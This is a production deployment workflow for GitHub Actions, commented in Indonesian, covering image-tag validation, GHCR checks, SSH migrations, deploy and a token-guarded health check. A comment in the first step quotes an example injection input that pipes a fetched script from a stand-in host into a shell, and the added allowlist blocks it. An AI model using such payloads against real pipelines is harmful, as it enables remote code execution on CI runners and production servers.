name: Deploy Production

on:
  push:
    tags: ["v*.*.*"]
  workflow_dispatch:
    inputs:
      image_tag:
        description: >-
          Commit sha untuk rollback/redeploy manual (kosongkan untuk deploy
          commit HEAD seperti biasa). Isi dengan sha rilis sebelumnya yang
          diketahui sehat -- cek tab Actions atau `git log --oneline`.
        required: false
        type: string

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: production   # atur "required reviewers" di Settings > Environments
    permissions:
      contents: read
      packages: read
    steps:
      # Temuan L2 (audit CI/CD): sebelumnya rollback cuma bisa manual via SSH
      # (scripts/rollback.sh). Kalau workflow_dispatch diisi image_tag, itu
      # dipakai apa adanya -- kalau kosong (trigger normal dari tag/dispatch
      # tanpa input), pakai commit HEAD seperti biasa.
      - name: Tentukan IMAGE_TAG
        id: image_tag
        # Audit keamanan 15 Sep 2026 (temuan Medium, command injection): input
        # workflow_dispatch `image_tag` sebelumnya diinterpolasi MENTAH lewat
        # ${{ }} langsung ke body shell script di step ini (termasuk di dalam
        # `[ -n "..." ]`) DAN ke beberapa run:/script SSH di bawah yang memakai
        # steps.image_tag.outputs.value (sed -i .env, docker manifest inspect,
        # dst). GitHub Actions mensubstitusi ${{ }} sebagai TEKS MENTAH sebelum
        # shell/SSH jalan (bukan lewat shell-variable expansion yang di-
        # escape) -- input semacam `"; curl evil.sh | sh #` bisa mengeksekusi
        # command arbitrer di runner INI, dan (lebih parah) DI DALAM sesi SSH
        # ke VPS PRODUCTION yang pegang PROD_SSH_KEY. Memicu workflow_dispatch
        # butuh akses write repo, tapi ini tetap celah defense-in-depth nyata
        # untuk kolaborator/PAT yang disusupi.
        #
        # Perbaikan: (1) nilai mentah HANYA disuntik sekali lewat env: di
        # bawah -- satu-satunya ${{ }} yang menyentuh input pengguna di
        # seluruh alur ini -- dipakai sebagai variabel shell biasa
        # ($INPUT_IMAGE_TAG) dari sini seterusnya; (2) validasi allowlist
        # SEBELUM nilainya sempat ditulis ke $GITHUB_OUTPUT, supaya semua step
        # lain (yang menurunkan nilainya dari steps.image_tag.outputs.value,
        # bukan dari input mentah lagi) otomatis ikut terlindungi. Format yang
        # valid di repo ini HANYA commit sha git (hex) atau tag rilis
        # semver-ish (mis. v1.2.3) -- keduanya cuma alfanumerik + titik/dash/
        # underscore, jadi allowlist itu cukup longgar untuk pemakaian sah
        # tapi cukup ketat untuk menolak metakarakter shell (`;|&$()<>` dkk,
        # spasi, newline).
        env:
          INPUT_IMAGE_TAG: ${{ github.event.inputs.image_tag }}
        run: |
          if [ -n "$INPUT_IMAGE_TAG" ]; then
            if ! echo "$INPUT_IMAGE_TAG" | grep -qE '^[A-Za-z0-9._-]+$'; then
              echo "::error::Input image_tag tidak valid: \"$INPUT_IMAGE_TAG\". Hanya huruf/angka/titik(.)/dash(-)/underscore(_) yang diperbolehkan (commit sha atau tag rilis, mis. v1.2.3) -- ditolak untuk mencegah command injection ke shell/SSH production di step-step berikutnya."
              exit 1
            fi
            echo "value=$INPUT_IMAGE_TAG" >> "$GITHUB_OUTPUT"
            echo "::notice::Rollback/redeploy manual ke tag: $INPUT_IMAGE_TAG"
          else
            echo "value=${{ github.sha }}" >> "$GITHUB_OUTPUT"
          fi

      # Bug #17 (katalog CICD-GUIDE.md): workflow ini terpicu langsung oleh
      # push tag, TANPA menunggu ci.yml (yang build & push image ke GHCR)
      # selesai -- beda dari deploy-staging.yml yang memang menunggu lewat
      # workflow_run. Kalau tag dibuat segera setelah push ke main (pola
      # rilis yang wajar), "Deploy via SSH" bisa gagal "not found" karena
      # image belum selesai di-build sama sekali -- race condition, bukan
      # masalah kredensial/koneksi. Ketahuan dari log run yang gagal
      # eksplisit (bukan cuma "stuck"), diperbaiki dengan menunggu image
      # benar-benar ada di GHCR sebelum lanjut (aman juga untuk rollback ke
      # commit lama yang image-nya sudah pasti ada -- loop langsung selesai).
      - name: Login ke GHCR (runner) untuk cek ketersediaan image
        uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Nama repository huruf kecil (wajib untuk GHCR)
        id: repo
        run: echo "lower=${GITHUB_REPOSITORY,,}" >> "$GITHUB_OUTPUT"

      - name: Tunggu image api & web tersedia di GHCR
        env:
          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
          REPO: ${{ steps.repo.outputs.lower }}
        run: |
          for i in $(seq 1 30); do
            if docker manifest inspect "ghcr.io/${REPO}/api:${IMAGE_TAG}" >/dev/null 2>&1 && \
               docker manifest inspect "ghcr.io/${REPO}/web:${IMAGE_TAG}" >/dev/null 2>&1; then
              echo "Image tersedia setelah percobaan ke-${i}."
              exit 0
            fi
            echo "Image belum tersedia (percobaan ${i}/30), tunggu 20 detik -- kemungkinan ci.yml masih build..."
            sleep 20
          done
          echo "::error::Image ghcr.io/${REPO}/{api,web}:${IMAGE_TAG} tidak pernah tersedia setelah 10 menit -- cek apakah commit/tag ini memang pernah lolos ci.yml (job build-images)."
          exit 1

      # ref di-checkout persis di commit/tag yang IMAGE_TAG-nya dipakai --
      # penting untuk rollback: docker-compose.prod.yml yang disinkronkan
      # harus versi yang cocok dengan rilis itu, bukan compose file terbaru
      # yang mungkin sudah punya service baru yang tidak dikenal image lama.
      - uses: actions/checkout@v4
        with:
          ref: ${{ steps.image_tag.outputs.value }}

      # Bug baru (katalog CICD-GUIDE.md #12): docker-compose.prod.yml di VPS
      # ditaruh manual sekali waktu setup awal dan TIDAK PERNAH disinkron
      # ulang -- ditemukan bareng dengan kasus staging saat menambah service
      # `minio` di Sprint 2 (lihat deploy-staging.yml untuk detail lengkap).
      - name: Sinkronkan docker-compose.prod.yml ke VPS
        uses: appleboy/scp-action@917f8b81dfc1ccd331fef9e2d61bdc6c8be94634 # v0.1.7 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_SSH_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          port: ${{ secrets.PROD_SSH_PORT }}
          source: "docker-compose.prod.yml"
          target: "/opt/jeonme-production/"
          strip_components: 0

      # Temuan kritis C2 (audit CI/CD): GHCR mewarisi visibility repo (default
      # private) -- tanpa login eksplisit di sisi VPS, `docker compose pull`
      # akan gagal 401/denied. Gunakan token read-only khusus VPS (scope
      # read:packages saja), bukan PAT developer pribadi.
      - name: Login GHCR di VPS
        uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_SSH_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          port: ${{ secrets.PROD_SSH_PORT }}
          script: |
            echo "${{ secrets.GHCR_PAT }}" | docker login ghcr.io -u "${{ secrets.GHCR_USERNAME }}" --password-stdin

      # Temuan kritis C1 (audit CI/CD): sebelumnya langkah ini hanya berisi
      # `echo` placeholder dan TIDAK menjalankan migrasi apa pun. Sekarang
      # memakai subcommand `migrate` bawaan image API yang baru saja di-pull
      # (image sudah membawa folder migrations yang persis cocok dengan versi
      # ini, lihat docker/api/Dockerfile) -- dijalankan lewat `compose run`
      # sekali pakai, terhubung ke network compose yang sama dengan db/redis.
      #
      # Catatan rollback: ini menjalankan `migrate up`, BUKAN `migrate down`.
      # Aman karena golang-migrate idempoten (skema yang sudah diterapkan
      # tidak diulang) -- tapi kalau rilis yang di-rollback butuh migrasi
      # turun (skema tidak backward-compatible), itu tetap perlu keputusan
      # manual, lihat catatan di scripts/rollback.sh.
      - name: Jalankan migrasi database (production)
        uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
        # Audit keamanan 15 Sep 2026: IMAGE_TAG (sudah divalidasi allowlist di
        # step "Tentukan IMAGE_TAG") disuntik lewat env: + envs: di bawah,
        # BUKAN raw ${{ }} langsung di dalam script SSH -- lihat komentar
        # lengkap di step "Tentukan IMAGE_TAG" soal kenapa ini penting
        # (script SSH ini pegang PROD_SSH_KEY, jalan di VPS production
        # sungguhan).
        env:
          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_SSH_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          port: ${{ secrets.PROD_SSH_PORT }}
          envs: IMAGE_TAG
          script: |
            set -e
            cd /opt/jeonme-production
            sed -i "s/^IMAGE_TAG=.*/IMAGE_TAG=${IMAGE_TAG}/" .env
            # pull_with_retry -- insiden nyata, 8 September 2026 (deploy
            # staging): "docker compose pull" gagal total ("dial tcp
            # ...:443: i/o timeout") menarik SATU image dari GHCR walau
            # login & image lain dari registry yang SAMA sukses ditarik --
            # gangguan jaringan sesaat VPS->GHCR, BUKAN masalah auth/
            # kredensial. docker compose pull TIDAK retry sendiri, jadi satu
            # hiccup jaringan menggagalkan seluruh job deploy. Coba ulang
            # berjeda (pola sama seperti retry Health check di bawah)
            # sebelum benar-benar menyerah -- diterapkan juga di
            # deploy-production.yml supaya production tidak kena insiden
            # yang sama di masa depan.
            pull_with_retry() {
              local file="$1"; shift
              local attempt
              for attempt in 1 2 3 4 5; do
                if docker compose -f "$file" pull "$@"; then
                  return 0
                fi
                echo "::warning::docker compose pull gagal (percobaan ${attempt}/5, kemungkinan gangguan jaringan sementara ke registry) -- coba lagi dalam 10 detik..."
                sleep 10
              done
              echo "::error::docker compose pull tetap gagal setelah 5 percobaan berturut-turut."
              return 1
            }
            # Sama seperti deploy-staging.yml: Modul Settings §3 (commit
            # 4baaad3) memperkenalkan ENCRYPTION_KEY (wajib PERSIS 32 byte,
            # fail-fast di production lewat mustGetEnvInProd) -- var ini belum
            # pernah ada di .env VPS manapun sebelum commit ini. Tanpa langkah
            # ini API container akan crash-loop begitu rilis ini sampai di
            # production, persis insiden yang terjadi di staging.
            # Idempotent -- hanya digenerate SEKALI, mengganti key setelahnya
            # akan membuat payout_methods yang sudah terenkripsi tak terbaca.
            if ! grep -q '^ENCRYPTION_KEY=' .env; then
              GENERATED_KEY=$(openssl rand -hex 16)
              echo "ENCRYPTION_KEY=${GENERATED_KEY}" >> .env
              echo "::warning::ENCRYPTION_KEY tidak ditemukan di .env production -- sudah digenerate otomatis (32 byte acak) dan disimpan permanen."
            fi
            pull_with_retry docker-compose.prod.yml api
            docker compose -f docker-compose.prod.yml run --rm api migrate up

      - name: Deploy via SSH
        uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
        # Audit keamanan 15 Sep 2026: lihat catatan di step "Jalankan migrasi
        # database (production)" di atas -- IMAGE_TAG disuntik lewat env: +
        # envs:, bukan raw ${{ }} di dalam script SSH.
        env:
          IMAGE_TAG: ${{ steps.image_tag.outputs.value }}
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_SSH_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          port: ${{ secrets.PROD_SSH_PORT }}
          envs: IMAGE_TAG
          script: |
            set -e
            cd /opt/jeonme-production
            sed -i "s/^IMAGE_TAG=.*/IMAGE_TAG=${IMAGE_TAG}/" .env
            # pull_with_retry -- lihat catatan lengkap di step "Jalankan
            # migrasi database" di atas (insiden nyata 8 September 2026,
            # i/o timeout sesaat ke GHCR) -- script SSH ini proses shell
            # TERPISAH dari step sebelumnya, jadi fungsi didefinisikan ulang.
            pull_with_retry() {
              local file="$1"; shift
              local attempt
              for attempt in 1 2 3 4 5; do
                if docker compose -f "$file" pull "$@"; then
                  return 0
                fi
                echo "::warning::docker compose pull gagal (percobaan ${attempt}/5, kemungkinan gangguan jaringan sementara ke registry) -- coba lagi dalam 10 detik..."
                sleep 10
              done
              echo "::error::docker compose pull tetap gagal setelah 5 percobaan berturut-turut."
              return 1
            }
            # Hanya image aplikasi kita (web/api/worker) yang ditarik ulang --
            # insiden 24 Sept 2026: quay.io/minio/minio mulai membalas 401
            # Unauthorized, sehingga 'pull' tanpa argumen (ikut menarik
            # minio) gagal 5x dan SEMUA deploy staging+prod macet sejak
            # v0.50.0 (disangka gangguan jaringan). Image pihak ketiga
            # (db/redis/minio) sudah ada di cache VPS; 'up' di bawah
            # memakainya apa adanya tanpa pull.
            pull_with_retry docker-compose.prod.yml web api worker
            # --force-recreate -- lihat komentar sama di deploy-staging.yml
            # (insiden nyata, 15 Agustus 2026: env var baru di .env tidak
            # cukup membuat `up -d` polos merecreate container kalau
            # konfigurasi image/tag terlihat tidak berubah dari deploy
            # sebelumnya).
            docker compose -f docker-compose.prod.yml up -d --remove-orphans --force-recreate
            # Insiden nyata, 14 Agustus 2026: deploy staging & production
            # berbagi SATU Docker daemon (VPS shared, lihat CLAUDE.md) --
            # kalau keduanya kebetulan deploy berdekatan, `docker image
            # prune` bisa saling tabrak ("a prune operation is already
            # running"). Housekeeping ini TIDAK esensial untuk keberhasilan
            # deploy (container baru di atas SUDAH `up -d` sebelum baris
            # ini) -- `set -e` di atas dulu membuat kegagalannya
            # menggagalkan SELURUH job padahal deploy sendiri sukses.
            # `|| true` supaya prune yang gagal tidak lagi menutupi status
            # deploy yang sebenarnya berhasil.
            docker image prune -f || true

      # Temuan sedang M2 (audit CI/CD): retry berjeda, bukan satu kali
      # sleep+curl -- container butuh waktu bervariasi untuk siap tergantung
      # kondisi koneksi DB/Redis saat cold start.
      #
      # Ditemukan dari rollout pertama: health check yang cuma mengecek
      # "server merespons ok" TIDAK bisa mendeteksi deploy yang gagal diam-
      # diam di tengah jalan -- container LAMA tetap menjawab sehat,
      # menyembunyikan bahwa versi baru tidak pernah benar-benar naik.
      # Sekarang verifikasi juga field `version` di respons cocok dengan
      # commit yang baru saja di-deploy (atau tag rollback yang diminta).
      # Audit keamanan 15 Agustus 2026: /api/health publik kini hanya
      # {"status":"ok"} (tanpa version) -- version tidak boleh terekspos ke
      # internet supaya penyerang tidak bisa fingerprint versi build untuk
      # riset CVE terarah. Percobaan pertama (commit 22fb30e) mengandalkan
      # deteksi loopback murni-IP (isInternalProbe, health.go) dan SENGAJA
      # menghindari secret HEALTH_TOKEN -- GAGAL TOTAL (insiden nyata, 15
      # Agustus 2026): api tidak jalan di host-network, portnya di-map lewat
      # Docker bridge ("127.0.0.1:${API_HOST_PORT}:8080", TANPA
      # network_mode: host) -- begitu request itu masuk ke container,
      # RemoteAddr yang terlihat BUKAN "127.0.0.1" lagi, melainkan gateway
      # bridge Docker. Lebih parah: Apache (mem-forward trafik PUBLIK asli)
      # JUGA lewat port mapping yang SAMA persis -- artinya tidak ada cara
      # membedakan "pengunjung publik asli" dari "probe CI" murni dari IP
      # yang terlihat container, MELEBARKAN allowlist IP di sini akan
      # membuka lagi kebocoran version ke publik yang jadi alasan
      # penguncian ini ada. Satu-satunya cara benar: header X-Health-Token
      # (mekanisme yang SUDAH ADA di health.go/config.go sejak awal,
      # cuma belum pernah benar-benar dipakai) -- WAJIB secret
      # PROD_HEALTH_TOKEN di repo GitHub DAN baris HEALTH_TOKEN=<nilai yang
      # sama> di /opt/jeonme-production/.env (lihat pesan error di bawah).
      - name: Health check (via SSH loopback di VPS)
        uses: appleboy/ssh-action@0ff4204d59e8e51228ff73bce53f80d53301dee2 # v1 -- audit OWASP A08 4 Sep 2026: SHA-pin (action ini pegang PROD_SSH_KEY/STAGING_SSH_KEY)
        # Audit keamanan 15 Sep 2026: EXPECTED_VERSION (dari
        # steps.image_tag.outputs.value, sudah divalidasi allowlist) disuntik
        # lewat env: + envs: seperti step SSH lain di atas, bukan raw ${{ }}
        # di dalam script. `envs:` di bawah sebelumnya sudah ada tapi tidak
        # tersambung ke env: apa pun di step ini -- sekarang benar-benar
        # dipakai action untuk export ke sesi SSH.
        env:
          EXPECTED_VERSION: ${{ steps.image_tag.outputs.value }}
          HEALTH_TOKEN: ${{ secrets.PROD_HEALTH_TOKEN }}
        with:
          host: ${{ secrets.PROD_HOST }}
          username: ${{ secrets.PROD_SSH_USER }}
          key: ${{ secrets.PROD_SSH_KEY }}
          port: ${{ secrets.PROD_SSH_PORT }}
          envs: EXPECTED_VERSION,HEALTH_TOKEN
          script: |
            set -e
            cd /opt/jeonme-production
            if [ -z "$HEALTH_TOKEN" ]; then
              echo "::error::Secret PROD_HEALTH_TOKEN belum diset -- health check tidak bisa memverifikasi version (lihat komentar step ini soal kenapa deteksi loopback murni-IP tidak bisa dipakai di sini). Set secret ini di GitHub (Settings > Secrets > Actions) DAN baris HEALTH_TOKEN=<nilai yang sama> di /opt/jeonme-production/.env di VPS, lalu deploy ulang."
              exit 1
            fi
            # API_HOST_PORT HANYA ada di .env (dibaca docker, BUKAN
            # diekspor ke shell session SSH), jadi baca langsung dari sana.
            # VPS shared sering pakai port unik per environment (SETUP-GUIDE
            # contoh 28080) -- default 8080 hanya kalau benar-benar kosong.
            API_PORT=$(grep -E '^API_HOST_PORT=' .env 2>/dev/null | cut -d= -f2 | tr -d '[:space:]')
            API_PORT="${API_PORT:-8080}"
            echo "Health check ke loopback 127.0.0.1:${API_PORT}/api/health (harapan version: ${EXPECTED_VERSION})"
            for i in $(seq 1 12); do
              BODY=$(curl -sf -H "X-Health-Token: ${HEALTH_TOKEN}" "http://127.0.0.1:${API_PORT}/api/health" 2>/dev/null || true)
              if [ -n "$BODY" ]; then
                echo "$BODY"
                if echo "$BODY" | grep -q "\"version\":\"${EXPECTED_VERSION}\""; then
                  echo "Versi terverifikasi cocok: ${EXPECTED_VERSION}"
                  exit 0
                fi
                echo "::error::Health check OK tapi versi yang jalan tidak cocok dengan yang diharapkan (${EXPECTED_VERSION}) -- kemungkinan deploy gagal diam-diam dan container lama masih jalan. Body: $BODY"
                exit 1
              fi
              echo "API belum siap (percobaan ${i}/12), tunggu 5 detik..."
              sleep 5
            done
            echo "::error::API tidak merespons di 127.0.0.1:${API_PORT} setelah 60 detik -- kemungkinan port salah atau container api crash-loop. Cek: docker compose -f /opt/jeonme-production/docker-compose.prod.yml logs --tail=50 api  &&  docker compose -f /opt/jeonme-production/docker-compose.prod.yml ps"
            exit 1
